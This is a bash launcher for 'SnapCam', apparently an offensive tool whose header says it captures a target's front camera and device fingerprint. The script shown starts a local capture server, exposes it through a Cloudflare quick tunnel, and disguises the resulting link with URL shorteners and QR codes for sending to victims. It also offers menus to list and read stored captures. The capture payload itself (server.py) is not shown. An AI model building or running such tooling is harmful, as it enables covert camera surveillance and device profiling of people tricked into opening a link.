#!/usr/bin/env bash
# SnapCam - front cam + device fingerprint capture over a Cloudflare tunnel
set -u
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PORT="${PORT:-8080}"
OUT="$DIR/captures"
SHORTEN=1
B="\033[1m"; R="\033[1;31m"; G="\033[1;32m"; Y="\033[1;33m"; C="\033[1;36m"; D="\033[2m"; N="\033[0m"

mkdir -p "$OUT" || exit 1
command -v python3 >/dev/null || { echo "[!] python3 required"; exit 1; }

SRV=""; TUN=""
kill_tunnel(){ [ -n "$TUN" ] && { kill "$TUN" 2>/dev/null; TUN=""; }; }
cleanup(){ kill_tunnel; [ -n "$SRV" ] && kill "$SRV" 2>/dev/null; }
trap 'echo; cleanup; exit 0' INT TERM

if ! command -v cloudflared >/dev/null 2>&1; then
  echo "[*] installing cloudflared…"
  case "$(uname -m)" in
    x86_64|amd64) A=amd64 ;; aarch64|arm64) A=arm64 ;;
    armv7l|armv8l|arm) A=arm ;; *) A=amd64 ;;
  esac
  mkdir -p "$HOME/.local/bin"
  curl -fsSL --max-time 90 "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-$A" \
    -o "$HOME/.local/bin/cloudflared" 2>/dev/null \
    && chmod +x "$HOME/.local/bin/cloudflared" && export PATH="$HOME/.local/bin:$PATH"
fi

( cd "$DIR" && python3 server.py "$PORT" ) & SRV=$!
sleep 1

banner(){
  clear
  printf "${R}"
  cat <<'ART'
   █████╗ ██████╗ ██╗  ██╗    ███████╗██╗     ██╗     ██╗ ██████╗ ████████╗
  ██╔══██╗██╔══██╗╚██╗██╔╝    ██╔════╝██║     ██║     ██║██╔═══██╗╚══██╔══╝
  ███████║██████╔╝ ╚███╔╝     █████╗  ██║     ██║     ██║██║   ██║   ██║
  ██╔══██║██╔══██╗ ██╔██╗     ██╔══╝  ██║     ██║     ██║██║   ██║   ██║
  ██║  ██║██║  ██║██╔╝ ██╗    ███████╗███████╗███████╗██║╚██████╔╝   ██║
  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝╚══════╝╚══════╝╚═╝ ╚═════╝    ╚═╝
ART
  printf "${N}${R}                    Created by Arx Elliot${N}\n\n"
}

shorten(){
  local u="$1" q a s
  q=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$u")
  a="arxelliot-$(head -c2 /dev/urandom | od -An -tx1 | tr -d ' \n')"
  s=$(curl -s --max-time 15 "https://is.gd/create.php?format=simple&url=$q&shorturl=$a")
  case "$s" in https://*) echo "$s"; return 0 ;; esac
  s=$(curl -s --max-time 15 "https://tinyurl.com/api-create.php?url=$q")
  case "$s" in https://*) echo "$s"; return 0 ;; esac
  echo ""
}

gen_link(){
  kill_tunnel
  : > /tmp/sc_cf.log
  cloudflared tunnel --url "http://127.0.0.1:$PORT" --no-autoupdate --protocol http2 > /tmp/sc_cf.log 2>&1 & TUN=$!
  local u=""
  for i in $(seq 1 30); do sleep 1
    u=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/sc_cf.log | head -1)
    [ -n "$u" ] && break
    kill -0 "$TUN" 2>/dev/null || break
  done
  if [ -z "$u" ]; then
    echo -e "  ${R}tunnel failed${N} ${D}(/tmp/sc_cf.log)${N}"; return 1
  fi
  local s=""
  [ "$SHORTEN" = "1" ] && s=$(shorten "$u")
  echo
  if [ -n "$s" ]; then
    echo -e "  ${G}LINK:${N} ${B}$s${N}"
    echo -e "  ${D}raw : $u${N}"
    command -v qrencode >/dev/null 2>&1 && qrencode -t ANSIUTF8 "$s"
  else
    echo -e "  ${G}LINK:${N} ${B}$u${N}"
    command -v qrencode >/dev/null 2>&1 && qrencode -t ANSIUTF8 "$u"
  fi
  echo
}

banner
echo -e "  ${D}starting tunnel…${N}"
gen_link
read -rp "  press Enter when ready…" _

while true; do
  banner
  echo -e "  ${C}[1]${N} New link (fresh tunnel)"
  echo -e "  ${C}[2]${N} Show captures"
  echo -e "  ${C}[3]${N} Show last capture"
  echo -e "  ${C}[4]${N} Quit"
  echo
  read -rp "  Choose: " CH
  case "$CH" in
    1) gen_link; read -rp "  Enter…" _ ;;
    2) ls -lt "$OUT" 2>/dev/null | head -20; read -rp "  Enter…" _ ;;
    3) cat "$OUT/latest.txt" 2>/dev/null || echo "  nothing yet"; read -rp "  Enter…" _ ;;
    4) cleanup; exit 0 ;;
  esac
done
